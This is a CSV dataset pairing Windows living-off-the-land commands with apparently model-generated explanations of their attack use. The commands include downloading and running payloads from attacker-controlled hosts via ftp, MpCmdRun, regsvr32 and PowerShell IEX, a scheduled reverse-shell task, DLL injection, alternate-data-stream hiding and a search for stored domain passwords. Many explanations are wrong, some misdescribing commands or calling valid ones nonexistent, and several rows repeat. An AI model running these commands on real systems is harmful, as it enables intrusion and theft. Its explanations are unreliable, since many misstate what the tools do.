prompt,response
csc.exe -out:My.exe File.cs,"Compile C# code and create an executable file, which can be used to execute malicious code on a Windows machine."
cscript c:\\ads\\file.txt:script.vbs,"This command can be used to execute a VBScript file stored in an Alternate Data Stream (ADS) of a text file, potentially allowing an attacker to hide their malicious code and evade detection."
DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile,"This command generates a proxy class for a specified web service and saves it as a file in the System32 directory, while also sending an encoded file to a specified webhook URL, potentially allowing an attacker to execute arbitrary code on the machine by replacing the URI with a malicious one."
DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://11.11.11.11/xxxxxxxxx?encodedfile,"This command could potentially be used in a cyberattack for 'living off the land' to download and execute a malicious file (in this case, the Windows calculator) from a remote server specified by the URI."
DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://10.10.10.10/xxxxxxxxx?encodedfile,"This command could potentially be used to download a file from a remote server and save it as the Windows calculator executable in the System32 directory, allowing an attacker to execute arbitrary code on the compromised machine."
"set ""SYSTEMROOT=C:\\Windows\\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr","This command sets the SYSTEMROOT environment variable to C:\\Windows\\Temp and then executes the desktopimgdownldr.exe program with parameters to download a file from a specified URL and set it as the lock screen image, potentially allowing an attacker to persistently display malicious content on the victim's machine."
rundll32.exe dfshim.dll,This command can be used to execute .NET applications and could potentially be used to run malicious code or execute a payload on a Windows machine.
diantz.exe c:\\pathToFile\\file.exe c:\\destinationFolder\\targetFile.txt:targetFile.cab,This command is not a standard Windows command and does not exist in a default Windows installation.
diantz.exe \\\\remotemachine\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,"This command can be used to compress a file on a remote machine and transfer it to a local machine, potentially for exfiltration of sensitive data."
diantz.exe \\\\11.121.12.13\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,This command can be used to copy a file from a remote machine to a local machine and package it into a CAB file. It can be used in a cyberattack to move malicious files from a compromised machine to a target machine.
diantz.exe \\\\10.10.10.10\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,This command can be used to copy a file from a remote machine to a local machine and package it into a CAB file. It can be used in a cyberattack to move malicious files from a compromised machine to a target machine.
diskshadow.exe /s c:\\test\\diskshadow.txt,"This command can be used to create a shadow copy of a volume, which can be useful for backing up or accessing files that are currently in use, and could potentially be used by an attacker to access sensitive data on a Windows machine."
diskshadow> exec calc.exe,"Potential use: Launching a malicious executable (in this case, the Windows calculator) using a legitimate Windows utility (diskshadow) for ""living off the land"" purposes.

What it does: Executes the Windows calculator program."
dllhost.exe /Processid:{CLSID},"This command can be used to execute arbitrary code within a COM surrogate process, potentially allowing an attacker to bypass application whitelisting or execute code with elevated privileges."
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll,"This command can be used to load a malicious DLL on a remote DNS server, potentially allowing an attacker to execute arbitrary code on the target machine."
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll,"This command can be used to load a malicious DLL file on a remote DNS server, potentially allowing an attacker to execute arbitrary code on the server."
dnscmd.exe 10.10.10.10 /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll,"This command can be used to load a malicious DLL file on a remote DNS server, potentially allowing an attacker to execute arbitrary code on the target machine."
esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs /o,"This command can be used to copy a file from one location to another and overwrite the destination file without prompting, which can be useful for hiding malicious scripts or replacing legitimate files with malicious ones."
esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o,"This command can be used to hide a malicious executable within an Alternate Data Stream (ADS) of a legitimate file, allowing an attacker to bypass detection and execute the malicious code using the legitimate file as a cover."
esentutl.exe /y \\\\live.sysinternals.com\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o,"This command can be used to download and execute a malicious executable from a remote server, potentially allowing an attacker to gain unauthorized access to a Windows machine."
esentutl.exe /y \\\\11.11.11.11\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o,"This command can be used to copy a malicious executable from a remote server to a Windows machine and overwrite a legitimate executable, potentially allowing an attacker to execute arbitrary code with elevated privileges."
esentutl.exe /y \\\\10.10.10.10\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o,"This command can be used to copy a malicious executable from a remote server to a Windows machine and overwrite a legitimate executable, allowing an attacker to execute their own code in place of the legitimate one."
eventvwr.exe,"Potential use in a cyberattack: Viewing and manipulating event logs to cover tracks or gather information.
What it might do on a Windows machine: Launch the Event Viewer, a tool for viewing and managing system and application logs."
expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat,"This command can be used to execute a hidden batch file stored in an Alternate Data Stream (ADS) on a remote WebDAV server, allowing an attacker to run malicious code on a victim's machine without detection."
expand c:\\ADS\\file1.bat c:\\ADS\\file2.bat,"This command concatenates the contents of two batch files and saves the result in a new file, which could potentially be used to execute malicious code or commands."
expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat,"This command can be used to hide a malicious batch file within an alternate data stream of a legitimate file, allowing an attacker to execute the malicious code while appearing to be a legitimate file."
expand \\\\11.12.13.14\\folder\\file.bat c:\\ADS\\file.txt:file.bat,"This command can be used to hide a malicious batch file within an Alternate Data Stream (ADS) of a legitimate file, allowing an attacker to execute the malicious code while appearing as a legitimate file on the system."
expand \\\\10.10.10.10\\folder\\file.bat c:\\ADS\\file.txt:file.bat,"This command can be used to hide a malicious batch file within an Alternate Data Stream (ADS) of a legitimate file, allowing an attacker to execute the malicious code while appearing to be a legitimate file."
explorer.exe /root,"Potential use: Launches Windows Explorer with a specific folder as the root directory.
Cyberattack use: Can be used to navigate to sensitive directories and steal data or execute malicious files."
Extexport.exe c:\\test foo bar,"Potential use in a cyberattack: Exporting data from a specified file or directory.
What it might do on a Windows machine: Export the contents of the ""test"" directory to a file named ""foo"" with a password of ""bar""."
extrac32 C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe,"This command can be used to extract a file from a cabinet (.cab) archive and save it to a specified location on the machine, potentially allowing an attacker to extract and execute a malicious file."
extrac32 /Y /C \\\\webdavserver\\share\\test.txt C:\\folder\\test.txt,"This command can be used to extract a file from a remote WebDAV server and copy it to a local folder on a Windows machine, potentially allowing an attacker to steal sensitive data from the remote server."
extrac32.exe /C C:\\Windows\\System32\\calc.exe C:\\Users\\user\\Desktop\\calc.exe,"This command extracts the calc.exe file from the System32 folder and copies it to the Desktop folder, potentially allowing an attacker to execute arbitrary code on the system."
findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe,"This command searches for all lines in the file.exe that do not contain the string ""W3AllLov3DonaldTrump"" and saves the output to a text file named ""file.txt:file.exe"" in the ""c:\ADS"" directory. 

Potential use in a cyberattack for 'living off the land': This command can be used to search for sensitive information in a file and extract it to a text file for exfiltration."
findstr /S /I cpassword \\\\sysvol\\policies\\*.xml,This command can be used to search for plaintext passwords in Group Policy Objects (GPOs) on a Windows domain controller.
findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.exe,"This command can be used to hide malicious code within an alternate data stream (ADS) of a legitimate file, making it difficult to detect and potentially allowing for persistence on the system."
forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe,"This command can be used to search for all instances of notepad.exe in the system32 folder and execute calc.exe in its place, potentially allowing for the execution of malicious code."
"forfiles /p c:\\windows\\system32 /m notepad.exe /c ""c:\\folder\\normal.dll:evil.exe""","This command can be used to hide a malicious executable (evil.exe) within a legitimate DLL file (normal.dll) by appending it to the end of the DLL file, and potentially evade detection by security software."
echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt,"This command can be used to download and execute the Windows calculator program (calc.exe) from an FTP server, potentially allowing an attacker to execute arbitrary code on the target machine."
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",This command can be used to download a payload from an attacker-controlled FTP server onto the victim's machine using the Windows command line.
"cmd.exe /c ""@echo open 11.11.11.11 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""","This command can be used to download a payload from an FTP server and execute it on the victim's machine, potentially allowing the attacker to gain remote access or control."
"cmd.exe /c ""@echo open 10.10.10.10 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",This command can be used to download a payload from an FTP server and execute it on the victim's machine.
"C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE""","This command can be used to download a file from a specified URL and save it to a specified destination on a Windows machine, potentially allowing an attacker to download and execute malicious code."
Gpscript /logon,"Potential use: Execute a script during user logon.
What it does: Runs a specified script during user logon."
HH.exe http://some.url/script.ps1,"This command can be used to execute a PowerShell script hosted on a remote server, allowing an attacker to download and run malicious code on a victim's machine."
HH.exe c:\\windows\\system32\\calc.exe,"This command can be used to execute the Windows Calculator (calc.exe) from the command line, potentially as a way to test if a command execution vulnerability exists on the system."
ie4uinit.exe -BaseSettings,"Potential use: Launch Internet Explorer with default settings to bypass security restrictions.
What it does: Initializes Internet Explorer with default settings."
ieexec.exe http://x.x.x.x:8080/bypass.exe,"This command can be used to download and execute a malicious executable from a remote server, potentially bypassing security measures on the target machine."
ieexec.exe http://10.10.10.10:8080/bypass.exe,"This command can be used to download and execute a malicious executable from a remote server, potentially allowing an attacker to gain unauthorized access or control of the compromised system."
ieexec.exe http://11.11.11.11:8080/bypass.exe,"This command can be used to download and execute a malicious executable from a remote server, allowing an attacker to gain control of the compromised machine."
ilasm.exe C:\\public\\test.txt /exe,"This command is not related to cyberattacks or living off the land techniques. 

However, to provide some information, ilasm.exe is a Microsoft Intermediate Language Assembler used to compile .NET assemblies from IL code, and the command is attempting to compile a text file as an executable."
InfDefaultInstall.exe Infdefaultinstall.inf,"Potential use: Install a malicious driver or application.
What it does: Installs a driver or application using the information in the specified .inf file."
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,"This command can be used to install a malicious .dll file as a Windows service, allowing for persistence and remote access to the compromised machine."
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,"This command can be used to install a malicious .dll file as a Windows service, allowing for persistence and remote access to the compromised machine."
jsc.exe scriptfile.js,"Execute a JScript or JavaScript file, which could potentially be used to run malicious code or scripts on a Windows machine."
makecab c:\\ADS\\autoruns.exe c:\\ADS\\cabtest.txt:autoruns.cab,"This command can be used to compress a file into a cabinet (.cab) file format, which can be used to hide malicious files or data within legitimate files on a Windows machine."
makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab,"This command can be used to compress a file into a cabinet (.cab) file format, which can be used to transfer files over the network, and potentially hide malicious files or payloads."
makecab \\\\10.10.10.10\\webdav\\file.exe C:\\Folder\\file.cab,"This command can be used to compress a file into a cabinet (.cab) file format and transfer it over the network to a remote location, potentially for exfiltration of data or malware delivery."
MavInject.exe 3110 /INJECTRUNNING c:\\folder\\evil.dll,"This command can be used to inject a malicious DLL into a running process, allowing an attacker to execute arbitrary code within the context of that process."
"Mavinject.exe 4172 /INJECTRUNNING ""c:\\ads\\file.txt:file.dll""","This command can be used to inject a malicious DLL into a running process, allowing an attacker to execute arbitrary code within the context of that process."
Microsoft.Workflow.Compiler.exe tests.xml results.xml,"Potential use in a cyberattack: Compiling and executing malicious code in a workflow to evade detection.

What it might do on a Windows machine: Compiles a workflow file (tests.xml) and saves the results to another file (results.xml)."
Microsoft.Workflow.Compiler.exe tests.txt results.txt,This command is used to compile a Microsoft Workflow file and can potentially be used to execute malicious code or scripts on a Windows machine.
mmc.exe -Embedding c:\\path\\to\\test.msc,This command can be used to execute a Microsoft Management Console (MMC) snap-in and potentially allow an attacker to perform administrative tasks on a compromised machine.
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\beacon.exe,This command can be used to download a malicious file from an attacker-controlled server and save it to a specific location on the victim's machine using Windows Defender's MpCmdRun.exe utility.
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\nicefile.txt:evil.exe,"This command can be used to download a malicious file from an attacker-controlled server and save it as a benign-looking file in a temporary directory on the victim's machine, potentially bypassing security controls."
msbuild.exe pshell.xml,"Potential use: Execute PowerShell scripts without invoking powershell.exe, which may bypass security restrictions.

What it does: Executes the MSBuild tool with the specified project file (pshell.xml), which may contain PowerShell code to be executed."
msbuild.exe project.csproj,"Potential use: Build malicious code or execute arbitrary code.
What it does: Compiles a Visual Studio project file into an executable or library."
Msconfig.exe -5,"This command does not exist. The correct command is ""msconfig"" and it is used to configure system startup and services. It could potentially be used to disable security software or enable malicious services during a cyberattack."
msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE,This command can be used to run a Windows diagnostic tool and potentially gather system information for reconnaissance purposes.
msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE,This command can be used to run a Windows diagnostic tool and potentially gather system information for reconnaissance purposes.
mshta.exe evilfile.hta,This command can be used to execute malicious code embedded in an HTA file and potentially gain remote access to a Windows machine.
"mshta.exe ""C:\\ads\\file.txt:file.hta""","This command can be used to execute a malicious HTA file disguised as a harmless text file, allowing an attacker to run arbitrary code on the victim's machine."
msiexec /quiet /i cmd.msi,"This command can be used to silently install a malicious payload (in this case, cmd.msi) on a victim's machine without their knowledge or consent."
netsh.exe add helper C:\\Users\\User\\file.dll,"This command can be used to add a malicious DLL file as a helper to a network configuration, allowing an attacker to intercept and manipulate network traffic."
odbcconf -f file.rsp,"This command can be used to install or configure ODBC drivers and data sources, which can be useful for accessing and exfiltrating data from databases on a compromised machine."
pcalua.exe -a calc.exe,"This command can be used to execute the Windows Calculator (calc.exe) with elevated privileges, potentially allowing an attacker to bypass security measures and gain access to sensitive information on the machine."
Pcwrun.exe c:\\temp\\beacon.exe,This command can be used to execute a beacon payload from a temporary directory on a compromised Windows machine.
pktmon.exe start --etw,"Potential use: Network reconnaissance and monitoring.
What it does: Starts packet capture and logging using Event Tracing for Windows (ETW) for network traffic analysis."
pnputil.exe -i -a C:\\Users\\hai\\Desktop\\mo.inf,"This command can be used to install a malicious driver on a Windows machine, potentially allowing for persistence or privilege escalation."
Presentationhost.exe C:\\temp\\Evil.xbap,"This command can be used to execute a malicious .xbap file from a specified location on the victim's machine, potentially allowing an attacker to gain remote access or execute further attacks."
print /D:C:\\ADS\\File.txt:file.exe C:\\ADS\\File.exe,"This command can be used to hide a malicious executable within an Alternate Data Stream (ADS) of a legitimate file, making it difficult to detect and allowing for persistence on the system."
print /D:C:\\ADS\\CopyOfFile.exe C:\\ADS\\FileToCopy.exe,"This command prints a file to a printer, but it could potentially be used to hide a file within an Alternate Data Stream (ADS) and execute it from there."
psr.exe /start /output D:\\test.zip /sc 1 /gui 0,"This command can be used to record user actions and take screenshots, potentially capturing sensitive information, and save them to a compressed file on the D drive without displaying the recording interface."
rasautou -d powershell.dll -p powershell -a a -e e,"This command can be used to execute PowerShell code from within a Remote Access Service (RAS) session, potentially allowing an attacker to bypass security measures and execute malicious code on a compromised machine."
reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ads\\file.txt:evilreg.reg,"This command exports the registry key ""HKLM\SOFTWARE\Microsoft\Evilreg"" to a file named ""evilreg.reg"" in the ""c:\ads\file.txt"" directory, which could potentially be used to steal sensitive information or modify system settings."
regasm.exe AllTheThingsx64.dll,"Registers a .NET assembly as a COM component, potentially allowing an attacker to execute arbitrary code on the system."
regasm.exe /U AllTheThingsx64.dll,"This command can be used to register a malicious .dll file as a COM object, allowing an attacker to execute arbitrary code on the compromised system."
regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey,"This command exports the registry key ""MyCustomRegKey"" under HKEY_CURRENT_USER to a file named ""file.txt:regfile.reg"" in the ""c:\ads"" directory, which could potentially be used to steal sensitive information or modify system settings."
regini.exe newfile.txt:hidden.ini,"This command can be used to hide a file (hidden.ini) by modifying the registry settings through a script (newfile.txt), which can be used in a cyberattack to conceal malicious files or data on a Windows machine."
"Register-cimprovider -path ""C:\\folder\\evil.dll""","This command can be used to register a malicious CIM provider DLL file, which can then be used to execute arbitrary code on the compromised system."
regsvcs.exe AllTheThingsx64.dll,This command can be used to execute arbitrary code and potentially achieve persistence on a compromised Windows machine.
regsvcs.exe AllTheThingsx64.dll,This command can be used to execute arbitrary code and potentially achieve persistence on a compromised Windows machine.
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and inject it into the scrobj.dll library, allowing an attacker to gain persistence and potentially execute further malicious actions on the compromised machine."
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and inject it into the scrobj.dll library, potentially allowing an attacker to gain remote access to the compromised machine."
replace.exe C:\\Source\\File.cab C:\\Destination /A,"This command can be used to replace a file on a Windows machine and potentially overwrite important system files, allowing an attacker to gain persistence or execute malicious code."
replace.exe \\\\webdav.host.com\\foo\\bar.exe c:\\outdir /A,"This command can be used to replace a legitimate executable with a malicious one on a remote machine, potentially allowing for remote code execution."
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,"This command can be used to test RPC connectivity and authentication, and in a cyberattack, it can be used to check if RPC is enabled and accessible on a target machine and potentially exploit it by establishing a connection and executing commands remotely."
rundll32.exe AllTheThingsx64,This is not a valid command.
"rundll32 ""C:\\ads\\file.txt:ADSDLL.dll""","This command can be used to execute a DLL file hidden in an Alternate Data Stream (ADS) of a text file, potentially allowing an attacker to execute malicious code on a Windows machine."
Runonce.exe /AlternateShellStartup,"Potential use: Persistence and privilege escalation.
What it does: Executes a command or script once during the next boot of the system, using an alternate shell instead of the default one."
runscripthelper.exe surfacecheck \\\\?\\C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt C:\\Test,"This command runs a script helper tool to check the surface of a file located at C:\Test\Microsoft\Diagnosis\scripts\test.txt and save the results in C:\Test, which could potentially be used to gather information about the file system and identify vulnerabilities."
"sc create evilservice binPath=""\\""c:\\\\ADS\\\\file.txt:cmd.exe\\"" /c echo works > \\""c:\\ADS\\works.txt\\"""" DisplayName= ""evilservice"" start= auto\\ & sc start evilservice","This command creates a Windows service that executes a command to write ""works"" to a file in an Alternate Data Stream, allowing for stealthy persistence and execution of malicious code."
"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr c:\\some\\directory\\revshell.exe","This command creates a scheduled task that runs a reverse shell executable every minute, allowing an attacker to maintain persistent access to the compromised machine."
Scriptrunner.exe -appvscript calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through the ScriptRunner application, potentially allowing an attacker to run arbitrary code or commands on a compromised machine."
"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""","This command can be used to download and execute a PowerShell script from a remote server, potentially allowing an attacker to execute arbitrary code on the compromised machine."
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""C:/Windows/System32/calc.exe""","This command injects a DLL into a running process and launches the Windows calculator, potentially allowing an attacker to execute arbitrary code on the compromised machine."
tttracer.exe C:\\windows\\system32\\calc.exe,"This command can be used to execute the Windows calculator (calc.exe) in a hidden manner, potentially as a decoy while other malicious activities are being carried out."
TTTracer.exe -dumpFull -attach pid,"Potential use: Dumping memory of a specific process for analysis.
What it does: Dumps the full memory of a process with a specific process ID."
vbc.exe /target:exe c:\\temp\\vbs\\run.vb,"This command can be used to compile a VBScript file into an executable file, which can then be used to execute malicious code on a Windows machine."
verclsid.exe /S /C {CLSID},"This command can be used to check the version of a COM object and potentially identify vulnerable versions, or to execute a malicious COM object with a specific CLSID."
wab.exe,"Potential use in a cyberattack: Harvest email addresses and contact information from Windows Address Book.
What it might do on a Windows machine: Launch the Windows Address Book application."
"wmic.exe process call create ""c:\\ads\\file.txt:program.exe""","This command can be used to execute a program hidden within an Alternate Data Stream (ADS) of a file, allowing an attacker to bypass detection and execute malicious code on a Windows machine."
wmic.exe process call create calc,"Potential use: Execute a calculator program on a remote Windows machine.
What it does: Creates a new process to run the Windows calculator program."
wscript c:\\ads\\file.txt:script.vbs,"This command can be used to execute a VBScript file located in a hidden Alternate Data Stream (ADS) of a text file, allowing an attacker to hide their malicious code and evade detection."
wsreset.exe,"Potential use in a cyberattack: Resetting Windows Store cache to bypass application whitelisting or to clear traces of malicious activity.
What it might do on a Windows machine: Reset Windows Store cache and delete all installed apps' data."
wuauclt.exe /UpdateDeploymentProvider <Full_Path_To_DLL> /RunHandlerComServer,This command can be used to execute a malicious DLL file and potentially download and install additional malware onto the compromised machine.
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},This command can be used to execute a custom wizard and could potentially be used in a cyberattack to run a malicious wizard on a Windows machine.
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM,This command can be used to execute a malicious script hosted on a remote server and potentially download and execute additional malware on the Windows machine.
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://10.10.10.10/raw/iLxUT5gM,This command can be used to run a specific wizard on a Windows machine and the potential use in a cyberattack for 'living off the land' could be to execute a malicious wizard that could install malware or perform other malicious actions on the system.
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://11.11.11.11/raw/iLxUT5gM,This command can be used to run a wizard on a Windows machine and the potential use in a cyberattack for 'living off the land' is to execute a malicious script or payload through the wizard.
rundll32.exe advpack.dll,This command can be used to execute malicious code or install malware through the installation of ActiveX controls or other software packages.
rundll32.exe advpack.dll,This command can be used to execute malicious code or install malware through the installation of ActiveX controls or other software packages.
